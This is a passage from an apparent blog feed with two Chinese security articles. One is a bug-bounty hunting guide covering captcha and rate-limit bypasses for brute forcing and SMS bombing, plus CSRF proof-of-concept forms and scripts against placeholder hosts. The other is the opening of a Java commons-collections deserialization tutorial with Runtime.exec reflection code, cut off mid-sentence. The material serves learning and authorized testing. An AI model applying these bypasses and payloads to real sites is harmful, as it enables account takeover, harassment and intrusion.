target="_blank" rel="noopener">https://github.com/yhy0/BBScan</a> （添加了springboot的泄露探测）</p><ul><li>可以对域名、ip、C段进行探测</li><li>快速探测管理后台</li><li>进行端口探测</li><li>探测敏感信息泄露</li><li>可以自定义扫描规则</li></ul><p>report下看报告,误报肯定会很多，但C段下很可能会有意想不到的资产。</p><h5 id="js信息收集"><a href="#js信息收集" class="headerlink" title="js信息收集"></a>js信息收集</h5><p>主要是爬取网站的敏感js文件，js中能收集到的信息:</p><ul><li>增加攻击面(url、域名)</li><li>敏感信息(密码、API密钥、加密方式)</li><li>代码中的潜在危险函数操作</li><li>具有已知漏洞的框架</li></ul><p>常用的工具</p><p>速度很快的jsfinder <a href="https://github.com/Threezh1/JSFinder" target="_blank" rel="noopener">https://github.com/Threezh1/JSFinder</a></p><p>xray的rad爬虫 <a href="https://github.com/chaitin/rad" target="_blank" rel="noopener">https://github.com/chaitin/rad</a></p><p>能够匹配敏感信息的JSINFO-SCAN：<a href="https://github.com/p1g3/JSINFO-SCAN" target="_blank" rel="noopener">https://github.com/p1g3/JSINFO-SCAN</a></p><h3 id="捡中低危漏洞的一些技巧"><a href="#捡中低危漏洞的一些技巧" class="headerlink" title="捡中低危漏洞的一些技巧"></a>捡中低危漏洞的一些技巧</h3><p> 刚开始挖src往往不知道从哪下手，首先我们其实可以从各个src平台提交漏洞下拉框里看一看收取的漏洞类型。然后针对性的去学习如何挖掘，比如某src收取的漏洞类型,我们就可以针对性的学习对应的挖掘技巧。</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">框架注入</span><br><span class="line"> 明文密码传输</span><br><span class="line"> 表单破解漏洞</span><br><span class="line"> <span class="selector-tag">IIS</span>短文件名泄露</span><br><span class="line"> 老旧过期的<span class="selector-tag">HTTPS</span>服务</span><br><span class="line"> 跨目录下载漏洞</span><br><span class="line"> 目录可浏览漏洞</span><br><span class="line"> <span class="selector-tag">LFI</span>本地文件包含漏洞</span><br><span class="line"> <span class="selector-tag">RFI</span>远程文件包含漏洞</span><br><span class="line"> <span class="selector-tag">HTTP</span>拒绝服务攻击</span><br><span class="line"> 弱口令登录</span><br><span class="line"> <span class="selector-tag">CSRF</span>跨站点请求伪造</span><br><span class="line"> <span class="selector-tag">Flash</span>点击劫持</span><br><span class="line"> <span class="selector-tag">SQL</span>注入漏洞</span><br><span class="line"> <span class="selector-tag">XSS</span>跨站脚本漏洞</span><br><span class="line"> 文件上传漏洞</span><br><span class="line"> 解析漏洞<span class="selector-pseudo">:IIS</span>解析漏洞</span><br><span class="line"> 解析漏洞<span class="selector-pseudo">:Apache</span>解析漏洞</span><br><span class="line"> <span class="selector-tag">Cookies</span>注入漏洞</span><br><span class="line"> 越权访问漏洞</span><br><span class="line"> 命令执行漏洞</span><br><span class="line"> <span class="selector-tag">Struts2</span>远程代码执行漏洞</span><br><span class="line"> 业务逻辑漏洞</span><br><span class="line"> 用户隐私泄露</span><br><span class="line"> 敏感信息泄漏(运维)</span><br><span class="line"> 敏感信息泄漏(研发)</span><br><span class="line"> 敏感文件泄漏(运维)(配置)</span><br><span class="line"> 敏感文件泄漏(运维)(权限)</span><br><span class="line"> 未验证的重定向和传递</span><br><span class="line"> <span class="selector-tag">Flash</span>跨域访问资源</span><br><span class="line"> 测试文件泄漏</span><br><span class="line"> 开启危险的<span class="selector-tag">HTTP</span>方法</span><br><span class="line"> <span class="selector-tag">HTTP</span>参数污染</span><br><span class="line"> <span class="selector-tag">Unicode</span>编码绕过</span><br><span class="line"> 源码泄漏</span><br><span class="line"> 后台目录泄漏</span><br><span class="line"> 链接注入漏洞</span><br><span class="line"> <span class="selector-tag">SSRF</span>服务器请求伪造</span><br><span class="line"> <span class="selector-tag">jsonp</span>劫持</span><br></pre></td></tr></table></figure><p>学习完基础的漏洞类型后，我们可以多看一些实战的漏洞报告。比如wooyun漏洞库和hackone上的报告。</p><ul><li>乌云漏洞库:<a href="https://wooyun.x10sec.org/" target="_blank" rel="noopener">https://wooyun.x10sec.org/</a></li><li>hackone报告：<a href="https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA" target="_blank" rel="noopener">https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA</a> 提取码:2klt</li></ul><p>这里列举一些我经常挖到的垃圾洞，生而为人，挖不到大洞，我很抱歉┭┮﹏┭┮。</p><h4 id="登录框处常见的一些漏洞"><a href="#登录框处常见的一些漏洞" class="headerlink" title="登录框处常见的一些漏洞"></a>登录框处常见的一些漏洞</h4><p> 在我们通过对目标的前期信息收集之后，首当其冲的往往就是各种奇奇怪怪的登录框，一般来说，大型的企业为了减少安全问题，一般都是用统一的登录接口登录不同的旗下网站，但是一些后台系统，运维系统，或者一些边缘业务使用了独立的注册、登录体系，这个时候往往就会存在安全问题。</p><p><strong>现在还能用的接码平台:</strong></p><ul><li><a href="http://www.114sim.com/" target="_blank" rel="noopener">http://www.114sim.com/</a></li><li><a href="https://yunduanxin.net/China-Phone-Number/" target="_blank" rel="noopener">https://yunduanxin.net/China-Phone-Number/</a></li><li><a href="https://www.materialtools.com/" target="_blank" rel="noopener">https://www.materialtools.com/</a></li></ul><h5 id="绕过限制导致的爆破、撞库、用户遍历漏洞"><a href="#绕过限制导致的爆破、撞库、用户遍历漏洞" class="headerlink" title="绕过限制导致的爆破、撞库、用户遍历漏洞"></a>绕过限制导致的爆破、撞库、用户遍历漏洞</h5><p>最常见的一种漏洞，尤其是一些老旧的后台系统，可能验证码抓个包就绕过去了。下面是一些常见的绕过姿势:</p><ul><li><p>验证码不刷新</p></li><li><p>验证码抓包绕过</p></li><li><p>验证码删除绕过</p></li><li><p>验证码置空绕过</p></li><li><p>修改xff头绕过:推荐个burp插件,<a href="https://github.com/TheKingOfDuck/burpFakeIP" target="_blank" rel="noopener">https://github.com/TheKingOfDuck/burpFakeIP</a></p></li><li><p>账号后加空格绕过账号错误次数限制。</p><p>一般来说如果只是简单的验证码绕过，一般都是低危，所以一般能够绕过验证码的情况，都要尝试爆破一波账号密码。</p></li></ul><h5 id="弱口令漏洞"><a href="#弱口令漏洞" class="headerlink" title="弱口令漏洞"></a>弱口令漏洞</h5><p><strong>没有验证码或者验证码可以绕过的情况</strong></p><p>直接上一手字典爆破，当然还是有一些小技巧:</p><ul><li><p>比如可以设置固定的弱密码，比如123456，然后爆破账号。</p></li><li><p>比如可以首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:<a href="https://github.com/HongLuDianXue/BaiLu-SED-Tool" target="_blank" rel="noopener">https://github.com/HongLuDianXue/BaiLu-SED-Tool</a></p><p>爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章:</p></li><li><p><a href="https://xz.aliyun.com/t/7823" target="_blank" rel="noopener">https://xz.aliyun.com/t/7823</a></p></li><li><p><a href="https://github.com/huyuanzhi2/password_brute_dictionary" target="_blank" rel="noopener">https://github.com/huyuanzhi2/password_brute_dictionary</a></p></li></ul><p><strong>有验证码且无法绕过的情况</strong></p><ul><li>github直接找员工账号邮箱，密码。</li><li>源码或者js文件查找线索，邮箱，或者加密的账号密码。</li><li>特定系统或者cms，搜索引擎搜索默认管理员或者测试密码。</li><li>手动尝试常见弱口令。</li></ul><h5 id="注册、登录、找回密码处的短信-邮箱轰炸漏洞"><a href="#注册、登录、找回密码处的短信-邮箱轰炸漏洞" class="headerlink" title="注册、登录、找回密码处的短信\邮箱轰炸漏洞"></a>注册、登录、找回密码处的短信\邮箱轰炸漏洞</h5><p>这个也挺常见的，一般可以对特定用户进行轰炸的是一定会收的，横向轰炸能够消耗资源的随缘收。常见的绕过姿势:</p><ul><li>加空格绕过</li><li>加任意字母绕过</li><li>前面加86绕过</li><li>xff头伪造ip绕过</li></ul><h5 id="逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞"><a href="#逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞" class="headerlink" title="逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞"></a>逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞</h5><p>因为这方面漏洞一旦出现基本都是高危，所以挖掘的时候</p><p>类似的思路我就不细说了,freebuf上有任意用户密码重置的系列文章,类似漏洞思路其实相差不大:</p><p><a href="https://www.freebuf.com/author/yangyangwithgnu" target="_blank" rel="noopener">https://www.freebuf.com/author/yangyangwithgnu</a></p><h4 id="常见的信息泄露漏洞"><a href="#常见的信息泄露漏洞" class="headerlink" title="常见的信息泄露漏洞"></a>常见的信息泄露漏洞</h4><p>敏感信息泄露的范围很广，我认为一般就是两大类，</p><ul><li>因为配置错误或者管理不当导致的企业内部信息泄露。</li><li>因为逻辑缺陷导致的用户资料泄露(遍历)。</li></ul><h5 id="github导致的信息泄露"><a href="#github导致的信息泄露" class="headerlink" title="github导致的信息泄露"></a>github导致的信息泄露</h5><ul><li><p>P牛知识星球里分享的github搜索关键词:<a href="https://twitter.com/obheda12/status/1316513838716551169" target="_blank" rel="noopener">https://twitter.com/obheda12/status/1316513838716551169</a></p></li><li><p>github子域名监控项目:<a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener">https://github.com/FeeiCN/GSIL</a></p></li><li><p>常见的泄露内容:</p><ul><li>员工内部邮箱、登录账号、密码。</li><li>企业的一些内部系统域名、ip泄露。</li><li>企业网站的工程代码、网站源码泄露，可以通过员工邮箱关键词查找，要注意日期，好几年的大概率不收了。</li></ul><p>乌云上有一些案例，可以看一看。</p></li></ul><h5 id="配置错误导致的信息泄露"><a href="#配置错误导致的信息泄露" class="headerlink" title="配置错误导致的信息泄露"></a>配置错误导致的信息泄露</h5><p>包含的类型很多，最重要的是有一份足够强大的字典和一个好用的扫描器。</p><p>我在实际进行探测的时候，对于大批量的域名来说，更喜欢先用一份精简的小字典先进行快速扫描</p><p>比如:</p><ul><li>备份文件的小字典</li><li>springboot泄露的小字典</li><li>网站后台的小字典</li></ul><p>比较出名的扫描器我们常见的dirsearch、dirmap，dirbuster等等。</p><p>可视化的比如TEST404系列、御剑扫描器使用体验也不错。</p><p> 注:信息泄露中比较常见的swagger-ui服务泄露，可能直接提交会忽略或者低危，别忘了进一步测试泄露的接口功能。</p><h5 id="越权导致的信息泄露"><a href="#越权导致的信息泄露" class="headerlink" title="越权导致的信息泄露"></a>越权导致的信息泄露</h5><p> 很多时候越权来来去去都是更改一个参数的问题,更多的时候还是要细心的一个一个测业务功能，注意观察和测试操作参数和对象参数，操作参数一般是增删改查对应特定业务的敏感操作、对象参数一般是用户或者物品等。</p><p>推荐几个burp插件:</p><ul><li>未授权检测： <a href="https://github.com/theLSA/burp-unauth-checker" target="_blank" rel="noopener">https://github.com/theLSA/burp-unauth-checker</a></li><li>敏感参数提取：<a href="https://github.com/theLSA/burp-sensitive-param-extractor" target="_blank" rel="noopener">https://github.com/theLSA/burp-sensitive-param-extractor</a></li><li>信息提取：<a href="https://github.com/theLSA/burp-info-extractor" target="_blank" rel="noopener">https://github.com/theLSA/burp-info-extractor</a></li></ul><p>插件的作用基本还是帮助我们快速定位敏感参数，实际测试还是需要我们一个包一个包仔细的分析程序逻辑。</p><p><strong>常见的一些越权情况:</strong></p><ul><li>基于用户ID的越权</li><li>基于功能对象ID的越权</li><li>基于上传对象ID的越权</li><li>基于未授权访问的越权</li><li>基于功能地址的越权</li><li>基于接口身份的越权</li></ul><h3 id="其他的OWASPTop10漏洞"><a href="#其他的OWASPTop10漏洞" class="headerlink" title="其他的OWASPTop10漏洞"></a>其他的OWASPTop10漏洞</h3><h4 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h4><p> CSRF漏洞在挖掘中最重要的是说明危害，比较容易扯皮，一般来说涉及用户资料、财产、权限的CSRF漏洞大概率会收，一般来说最高就是中危。捡捡垃圾洞还是可以的。</p><p><strong>常见的漏洞点</strong></p><p>1、修改个人资料、邮箱、密码、头像</p><p>2、发表文章</p><p>3、添加、删除评论</p><p>4、添加、修改、删除收货地址</p><p>5、添加管理员</p><p><strong>(1) GET型</strong></p><p>GET类型的CSRF利用非常简单，只需要一个HTTP请求，所以，一般会这样利用：</p><ul><li><pre><code>&lt;img src=http://www.xxxxx.com/csrf?xx=11 /&gt;<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(**2) <span class="keyword">POST</span>型**</span><br><span class="line"></span><br><span class="line"> <span class="keyword">POST</span>请求中没有<span class="keyword">token</span>参数，然后请求也没有验证referer信息。这种是存在CSRF情况最多的一种。这种漏洞的检测方法也很简单，网页操作某功能，抓包后，如果发现没有<span class="keyword">token</span>等参数，然后就将referer信息设置为空，再次发包请求，如果请求成功了，就说明这里有CSRF漏洞。</span><br><span class="line"></span><br><span class="line">poc(可以用burp自己生成的）:</span><br></pre></td></tr></table></figure>&lt;html&gt;    &lt;body&gt;         &lt;form name=&quot;px&quot; method=&quot;post&quot; action=&quot;http://www.xxxxx.com/add&quot;&gt;            &lt;input type=&quot;text&quot; name=&quot;user_id&quot; value=&quot;1111&quot;&gt;        &lt;/form&gt;       &lt;script&gt;document.px.submit(); &lt;/script&gt;     &lt;/body&gt; &lt;/html&gt;<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">POST</span>请求数据为json，当服务器没有严格校验content-<span class="keyword">type</span>类型时，<span class="type">POC</span>为：</span><br></pre></td></tr></table></figure>&lt;script&gt;  var xhr = new XMLHttpRequest();  xhr.open(&quot;POST&quot;, &quot;http://www.xxxx.com/api/setrole&quot;);  xhr.withCredentials = true;  xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;text/plain;charset=UTF-8&quot;);  xhr.send(&apos;{&quot;role&quot;:admin}&apos;);&lt;/script&gt;<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### <span class="number">3.</span> Flash 型</span><br><span class="line"></span><br><span class="line">Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造。</span><br><span class="line"></span><br><span class="line">利用条件：</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、目标站点下必须存在crossdomain.xml文件。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、crossdomain.xml中的配置允许其他域进行跨域请求。</span><br></pre></td></tr></table></figure>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;cross-domain-policy&gt;  &lt;allow-access-from domain=&quot;*&quot; /&gt;&lt;/cross-domain-policy&gt;</code></pre></li></ul><p><strong>bypass小技巧</strong></p><ul><li>删除csrf token</li><li>置空csrf token</li><li>修改请求方法，如POST方法变GET请求</li><li>使用与token相同长度的任意字符串替换token，例如尝试更改一个字符，看看或发生什么</li><li>使用固定token</li><li>token字段改成 token[]=</li></ul><h4 id="任意文件上传漏洞"><a href="#任意文件上传漏洞" class="headerlink" title="任意文件上传漏洞"></a>任意文件上传漏洞</h4><p> 这个洞遇到的也比较多，一般来说是后端没有限制上传文件的类型。但是上传的脚本文件也不会解析。也就没有办法getshell。(很多SRC对于上传到cdn云服务器的任意文件上传是忽略的)。</p><ul><li><p>上传含有xss代码的html文件，造成存储型xss(如果上传到了cdn服务器之类的大概率忽略)。</p></li><li><p>上传恶意文件进行钓鱼</p></li><li><p>尝试在上传的文件名前加../进行目录穿越。</p></li><li><p>可以结合其他漏洞比如CORS漏洞扩大危害。</p><p>文件上传的常见的绕过姿势应该也挺熟悉的了。。，实际测试的时候发现在进行申请企业、个人认证的时候，上传文件处常常有这个问题。</p></li></ul><h4 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h4><p>老熟人了，不多说了，常见的姿势大家应该都知道。分享一个我学XSS的文章:<br><a href="https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html" target="_blank" rel="noopener">https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html</a></p><p>Broken5师傅的xsspayload:</p><p><strong>hexo这里貌似会一直解析payload就不贴了，可以去先知看原文:)</strong></p><h5 id="bypass姿势"><a href="#bypass姿势" class="headerlink" title="bypass姿势"></a>bypass姿势</h5><h4 id="威胁情报的提交"><a href="#威胁情报的提交" class="headerlink" title="威胁情报的提交"></a>威胁情报的提交</h4><p>这块我也没有经验，给大家分享两篇文章吧。。。信息收集到了还是可以试试提交的</p><p><a href="https://mp.weixin.qq.com/s/v2MRx7qs70lpnW9n-mJ7_Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/v2MRx7qs70lpnW9n-mJ7_Q</a></p><p><a href="https://bbs.ichunqiu.com/article-921-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/article-921-1.html</a></p><p>可以试一试加一加各种羊毛群，反手撸一手羊毛群的羊毛。</p><h3 id="对于挖掘高危、严重级别漏洞的一些思考"><a href="#对于挖掘高危、严重级别漏洞的一些思考" class="headerlink" title="对于挖掘高危、严重级别漏洞的一些思考"></a>对于挖掘高危、严重级别漏洞的一些思考</h3><p> 因为一直以来挖到高危、严重的数量寥寥无几，基本上就是一直在捡一些中低危漏洞，这段时间也看了很多牛叉的漏洞报告，想聊一聊我的思考。</p><h5 id="1-自动化信息收集的能力"><a href="#1-自动化信息收集的能力" class="headerlink" title="1.自动化信息收集的能力"></a>1.自动化信息收集的能力</h5><p>这里说的信息收集更多的是如何利用已有的工具进行快速自动化的收集和整理，既要做到速度快，还要做到全面收集不遗漏信息，很多时候这个过程本身就是在发现漏洞。</p><p> 这些工作应该在我们前期信息收集的阶段就应该全面的完成，所以如何快速化的进行全面的信息收集是我们需要思考和不断实践的。</p><h5 id="2-打漏洞组合拳的能力"><a href="#2-打漏洞组合拳的能力" class="headerlink" title="2.打漏洞组合拳的能力"></a>2.打漏洞组合拳的能力</h5><p> SRC对于漏洞评级主要是看你漏洞可以造成的危害，所以当挖到一些低危漏洞时，可以先不急着提交，找一找有没有其他可以利用的点打漏洞组合拳。</p><h5 id="3-绕waf的能力"><a href="#3-绕waf的能力" class="headerlink" title="3.绕waf的能力"></a>3.绕waf的能力</h5><p> 这个能力挺欠缺的。挖洞的过程基本遇到waf就溜了，尤其是一些大厂的waf，绕其他waf就是直接嫖一些其他的师傅的思路。</p><h5 id="4-细心和耐心和一些运气"><a href="#4-细心和耐心和一些运气" class="headerlink" title="4.细心和耐心和一些运气"></a>4.细心和耐心和一些运气</h5><p>心细挖天下，再加上一些运气，可能高危严重就到手了。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p> 挖SRC需要有一个好心态，国内SRC生态并不是很好，SRC感觉更多的提供了一个相对安全的测试保障，所以更需要抱着一种学习的心态去挖，将我们学习的到的知识灵活运用，发现新的问题。不要想我今晚一定要挖到多少漏洞，要拿到多少奖金，不然可能会被忽略三连打崩心态。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文首先于先知社区:&lt;a href=&quot;https://xz.aliyun.com/t/8501&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;SRC混子的漏洞挖掘之道 - 先知社区 (aliyun.com)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;一个SRC混子挖SRC的半
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>从apache-commons-collections中学习java反序列化</title>
    <link href="https://shu1l.github.io/2020/11/25/cong-apache-commons-collections-zhong-xue-xi-java-fan-xu-lie-hua/"/>
    <id>https://shu1l.github.io/2020/11/25/cong-apache-commons-collections-zhong-xue-xi-java-fan-xu-lie-hua/</id>
    <published>2020-11-25T08:42:12.000Z</published>
    <updated>2020-11-25T09:20:52.962Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于先知社区:<a href="https://xz.aliyun.com/t/8500" target="_blank" rel="noopener">从apache-commons-collections中学习java反序列化 - 先知社区 (aliyun.com)</a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​    java安全学习的第一篇文章，<strong>apache commons collections3.1</strong>的反序列化漏洞是java历史上最出名同时也是最具有代表性的反序列化漏洞，废话不多说，我们直接上手分析。希望能帮助到和我一样的初学者。</p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><ul><li>jdk 1.7版本</li><li>IntelliJ IDEA<ul><li>File -&gt; Project Structure -&gt;Modules-&gt; Dependencies -&gt;JARs or directories</li></ul></li><li>commons-collections-3.1 jar<ul><li>可以直接使用idea自带的maven下载依赖包:</li><li><a href="https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1" target="_blank" rel="noopener">https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1</a></li></ul></li></ul><h3 id="基础知识准备"><a href="#基础知识准备" class="headerlink" title="基础知识准备"></a>基础知识准备</h3><h4 id="java反射机制"><a href="#java反射机制" class="headerlink" title="java反射机制"></a>java反射机制</h4><p>​    反射就是在运行时才知道要操作的类是什么，并且可以在运行时获取类的完整构造，并调用对应的方法。</p><p>​    Java反射在编写漏洞利用代码、代码审计、绕过RASP方法限制等中起到了至关重要的作用。</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Java.lang.Class;</span><br><span class="line">Java.lang.reflect<span class="function">.<span class="keyword">Constructor</span>;</span></span><br><span class="line">Java.lang.reflect.Field;</span><br><span class="line">Java.lang.reflect<span class="function">.<span class="keyword">Method</span>;</span></span><br><span class="line">Java.lang.reflect.Modifier;</span><br></pre></td></tr></table></figure><h5 id="获取反射中的Class对象"><a href="#获取反射中的Class对象" class="headerlink" title="获取反射中的Class对象"></a>获取反射中的Class对象</h5><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#<span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span>forName 静态方法</span><br><span class="line">Class clz = <span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span>for<span class="constructor">Name(<span class="string">"java.lang.String"</span>)</span>;</span><br><span class="line">#使用 .<span class="keyword">class</span> 方法。</span><br><span class="line">Class clz = <span class="module-access"><span class="module"><span class="identifier">String</span>.</span></span><span class="keyword">class</span>;</span><br><span class="line">#使用类对象的 get<span class="constructor">Class()</span> 方法</span><br><span class="line">String str = <span class="keyword">new</span> <span class="constructor">String(<span class="string">"Hello"</span>)</span>;</span><br><span class="line">Class clz = str.get<span class="constructor">Class()</span>;</span><br></pre></td></tr></table></figure><h5 id="获取方法"><a href="#获取方法" class="headerlink" title="获取方法"></a>获取方法</h5><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getMethod方法返回一个特定的方法，其中第一个参数为方法名称，后面的参数为方法的参数对应<span class="keyword">Class</span>的对象</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">Method</span> <span class="title">getMethod</span><span class="params">(String name, <span class="keyword">Class</span>&lt;?&gt;... parameterTypes)</span></span></span><br></pre></td></tr></table></figure><h5 id="反射Runtime执行本地命令"><a href="#反射Runtime执行本地命令" class="headerlink" title="反射Runtime执行本地命令"></a>反射Runtime执行本地命令</h5><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取Runtime类对象</span></span><br><span class="line">Class runtimeClass1 = <span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span>for<span class="constructor">Name(<span class="string">"java.lang.Runtime"</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取构造方法</span></span><br><span class="line">Constructor constructor = runtimeClass1.get<span class="constructor">DeclaredConstructor()</span>;</span><br><span class="line">constructor.set<span class="constructor">Accessible(<span class="params">true</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建Runtime类示例，等价于 Runtime rt = new Runtime();</span></span><br><span class="line">Object runtimeInstance = constructor.<span class="keyword">new</span><span class="constructor">Instance()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取Runtime的exec(String cmd)方法</span></span><br><span class="line">Method runtimeMethod = runtimeClass1.get<span class="constructor">Method(<span class="string">"exec"</span>, String.<span class="params">class</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用exec方法，等价于 rt.exec(cmd);</span></span><br><span class="line">Process process = (Process) runtimeMethod.invoke(runtimeInstance, cmd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取命令执行结果</span></span><br><span class="line">InputStream <span class="keyword">in</span> = process.get<span class="constructor">InputStream()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出命令执行结果</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="module-access"><span class="module"><span class="identifier">IOUtils</span>.</span></span><span class="keyword">to</span><span class="constructor">String(<span class="params">in</span>, <span class="string">"UTF-8"</span>)</span>);</span><br></pre></td></tr></table></figure><h4 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h4><p>​    类似php中反序列化使用的魔术方法，比如__destruct函数。在java中，<strong>readObject</strong>方法在反序列化漏洞时起到了至关重要的作用，利用ObjectInputStream的readObject方法进行对象读取的时候，<strong>当readObject()方法被重写的时候，反序列化该类时调用的就是重写的方法。</strong></p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> writeObject(ObjectOutputStream oos)  <span class="comment">//自定义序列化</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> readObject(ObjectInputStream ois)  <span class="comment">//自定义反序列化</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> readObjectNoData()</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">Object</span> writeReplace()  <span class="comment">//写入时替换对象。</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">Object</span> readResolve()</span><br></pre></td></tr></table></figure><p>反序列化时会自动调用readObject(ObjectInputStream)方法。我们通过在需要序列化/反序列化的类中定义<code>readObject</code>和<code>writeObject</code>方法从而实现自定义的序列化和反序列化操作。</p><h3 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h3><p>我们在分析cc链反序列化化漏洞的主要思路其实就是两条:</p><ul><li>利用<code>InvokerTransformer</code> 、 <code>ConstantTransformer</code> 、 <code>ChainedTransformer</code> 等类构建反射链，利用java的反射机制，然后通过类中的transformer类来调用。</li><li>找Common Collections中的类在反序列化时，会触发调用 <code>transform</code> 方法的情况，并以此来构建反序列化漏洞的攻击链。</li></ul><p>接下来我们使用IDEA跟进代码进行审计</p><h4 id="一、寻找反射链"><a href="#一、寻找反射链" class="headerlink" title="一、寻找反射链"></a>一、寻找反射链</h4><h5 id="org-apache-commons-collections-functors-InvokerTransformer"><a href="#org-apache-commons-collections-functors-InvokerTransformer" class="headerlink" title="org/apache/commons/collections/functors/InvokerTransformer"></a>org/apache/commons/collections/functors/InvokerTransformer</h5><p><strong>IDEA跟进类中(48~61行):</strong></p><p><img src="/2020/11/25/cong-apache-commons-collections-zhong-xue-xi-java-fan-xu-lie-hua/QQ%E6%88%AA%E5%9B%BE20201107192725.png" alt></p><p>​    可以看到此处的transform方法调用了java的反射机制,并且发现<code>this.iMethodName</code> , <code>this.iParamTypes</code>, 